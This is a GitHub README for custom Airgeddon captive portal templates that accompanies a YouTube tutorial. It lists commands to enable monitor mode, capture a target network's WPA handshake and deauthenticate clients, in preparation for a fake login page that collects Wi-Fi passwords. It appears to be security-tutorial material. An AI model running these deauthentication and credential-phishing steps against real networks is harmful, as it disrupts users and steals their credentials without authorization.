# Airgeddon-Custom-Captive-Portal-Templates
Github repo from YouTube tutorial about customizing Airgeddon's Captive Portal template.

YouTube Video: https://youtu.be/M0TMHRuA2To

It's recommended to previously have captured the handshake as Airgeddon only gives 100 seconds tops to do this. Also, to take note of the MAC address of the network to update it in the check.htm file.

1. airmon-ng start wlan0 (Enable monitor mode)
2. airodump-ng wlan0mon (Listen to all networks. Jot down the BSSID and channel the network is in)
3. airodump-ng --bssid [MAC] --channel 1 -w wpa_log wlan0mon (Listen only to the victim network, capturing the handshake)

* It may be necessary to de-authenticate the clients for them to connect again and grab the handshake.
aireplay-ng --deauth 20 -a [MAC] wlan0mon
If -c [client] is specified, only that mac's user device will be de-authenticated.

# Regular template
![1](https://github.com/maddsec/Airgeddon-Custom-Captive-Portal-Templates/assets/88505855/1038c55d-57d3-4f80-aea6-20e200d755b5)

![2](https://github.com/maddsec/Airgeddon-Custom-Captive-Portal-Templates/assets/88505855/f826e09a-2f46-4eb4-a1a4-3eb6b1d34c77)

# Template with username
![3](https://github.com/maddsec/Airgeddon-Custom-Captive-Portal-Templates/assets/88505855/6607655d-d2d2-47af-a6e9-6c3e0e472f59)

![4](https://github.com/maddsec/Airgeddon-Custom-Captive-Portal-Templates/assets/88505855/d4d87d59-c6c2-481e-b71f-7dd3c48e0da0)

![image](https://github.com/maddsec/Airgeddon-Custom-Captive-Portal-Templates/assets/88505855/a7eaa6dd-e9f8-4e3f-971b-9fcde7b0cdda)
